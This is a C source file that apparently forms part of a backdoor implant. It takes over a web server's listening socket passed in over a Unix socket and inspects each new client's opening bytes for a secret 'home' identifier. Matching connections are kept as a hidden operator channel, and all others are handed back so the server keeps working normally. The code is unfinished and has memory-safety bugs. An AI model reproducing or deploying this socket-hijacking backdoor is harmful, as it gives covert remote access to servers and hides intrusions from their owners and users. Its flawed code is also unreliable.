#include "connection_management.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "utils/helpers.h"
#include "utils/unix_socket.h"


#define PORT 3000 //change to 443
#define BACKLOG 16
#define MAX_CLIENTS FD_SETSIZE

static const char RESPONSE[] =
    "HTTP/1.0 200 OK\r\n"
    "Content-Type: text/plain\r\n"
    "Content-Length: 13\r\n"
    "Connection: close\r\n"
    "\r\n"
    "Hello, world!";

static int bytes_to_read = sizeof(HOME_IDENTIFIER);

int initiate_connection(int injection_connection_fd, int web_server_listening_fd) {
    int * web_server_fd = (int*) calloc(1, sizeof(int));
    *web_server_fd = web_server_listening_fd;

    debug_print(stdout, "Sent listening fd to web server");
    if (write(injection_connection_fd, web_server_fd, sizeof(*web_server_fd)) == -1) {
        printf("Failed to write web server fd to unix socket. fd: %d\n", *web_server_fd);
        return -1;
    }

    char required_buffer[1] = {0};
    int * listening_fd = (int*) malloc(sizeof(int));

    recv_fd_over_unix_socket(injection_connection_fd, listening_fd, required_buffer, 1);

    if (*listening_fd == -1) {
        printf("Failed to receive initial FD over unix socket. fd: %d\n", *listening_fd);
        return -1;
    }
    debug_print(stdout, "received web server listening fd: %d\n", *listening_fd);

    return *listening_fd;
}

static int is_home_connection(char * initial_data) {
    if (strcmp(HOME_IDENTIFIER, initial_data) == 0) {
        return 1;
    }

    return 0;
}

static int should_read_client_data(int client_index, int * client_fds, char * has_read_from_client_connection) {
    if (client_fds[client_index] != -1 && has_read_from_client_connection[client_index] == 0) {
        return 1;
    }

    return 0;
}

static int add_client(int client_fd, int * client_fds, char client_initial_msgs[MAX_CLIENTS][bytes_to_read]) {
    int client_index;

    for (client_index = 0; client_index < MAX_CLIENTS; ++client_index) {
        if (client_fds[client_index] < 0) {
            client_fds[client_index] = client_fd;
            break;
        }
    }

    memset(client_initial_msgs[client_index], 0, bytes_to_read);

    return client_index;
}

static void remove_client(int client_index, int * client_fds, char client_initial_msgs[MAX_CLIENTS][bytes_to_read]) {
    client_fds[client_index] = -1;
    memset(client_initial_msgs[client_index], 0, bytes_to_read);
}

int intercept_connections(int listening_web_server_fd, int injection_connection_fd)
{
    if (listening_web_server_fd < 0) {
        printf("Received invalid fd to intercept. fd: %d\n", listening_web_server_fd);

        return 1;
    }

    int rc;

    // char ** client_initial_msgs = (char **) calloc(MAX_CLIENTS, bytes_to_read);
    char client_initial_msgs[MAX_CLIENTS][bytes_to_read];
    memset(client_initial_msgs, 0, sizeof(client_initial_msgs));

    char has_read_from_client_connection[MAX_CLIENTS];
    int client_fds[MAX_CLIENTS];
    int client_index;

    for (client_index = 0; client_index < MAX_CLIENTS; ++client_index) {
        client_fds[client_index] = -1;
    }

    pid_t pid = getpid();

    printf("[%d]: Listening on port %d...\n", pid, PORT);


    while (1) {
        fd_set readfds;
        int maxfd = listening_web_server_fd;

        FD_ZERO(&readfds);
        FD_SET(listening_web_server_fd, &readfds);

        /* Add clients to fd set */
        for (client_index = 0; client_index < MAX_CLIENTS; ++client_index) {
            int fd = client_fds[client_index];
            if (fd >= 0) {
                FD_SET(fd, &readfds);
                if (fd > maxfd) {
                    maxfd = fd;
                }
            }
        }

        rc = select(maxfd + 1, &readfds, NULL, NULL, NULL);
        if (rc < 0) {
            if (errno == EINTR) {
                continue;
            }
            perror("select");
            break;
        }

        /* New incoming connection? */
        if (FD_ISSET(listening_web_server_fd, &readfds)) {
            struct sockaddr_in cli_addr;
            socklen_t cli_len = sizeof(cli_addr);
            printf("intecepting accept\n");
            int new_fd = accept(listening_web_server_fd, (struct sockaddr *)&cli_addr, &cli_len);

            if (new_fd < 0) {
                fprintf(stderr, "Failed to accept client!\n");
            } else {
                printf("New connection from %s:%d (fd=%d)\n",
                       inet_ntoa(cli_addr.sin_addr),
                       ntohs(cli_addr.sin_port),
                       new_fd);
                client_index = add_client(new_fd, client_fds, client_initial_msgs);

                if (client_index == MAX_CLIENTS) {
                    fprintf(stderr, "Too many clients, closing fd=%d\n", new_fd);
                    close(new_fd);
                }
            }
        }

        /* Handle existing clients */
        for (client_index = 0; client_index < MAX_CLIENTS; ++client_index) {
            int fd = client_fds[client_index];
            if (fd < 0) {
                continue;
            }

            if (
                FD_ISSET(fd, &readfds)
                && should_read_client_data(client_index, client_fds, has_read_from_client_connection) == 1) {

                char client_data[bytes_to_read];
                ssize_t received_bytes = read_n(fd, client_data, sizeof(client_data));

                printf("[connection manager] Receieved: \"%s\"\n", client_data);

                // ssize_t n = recv(fd, client_data, sizeof(client_data) - 1, 0);
                if (received_bytes <= 0) {
                    /* error or client closed */
                    if (received_bytes < 0) {
                        fprintf(stderr, "Failed to recv from client, fd=%d\n", fd);
                    }
                    fprintf(stderr, "client closed connection, fd=%d\n", fd);

                    close(fd);
                    remove_client(client_index, client_fds, client_initial_msgs);
                } else {

                    if (is_home_connection(client_data)) {
                        //TODO: Move home connection to different array!
                        fprintf(stdout, "Received connection from home!, fd=%d\n", fd);

                    } else {
                        send_fd_over_unix_socket(
                            injection_connection_fd,
                            client_fds[client_index],
                            client_data,
                            bytes_to_read);
                        remove_client(client_index, client_fds, client_initial_msgs);
                    }
                }
            }
        }
    }

    // close(listening_web_server_fd);
    return 0;
}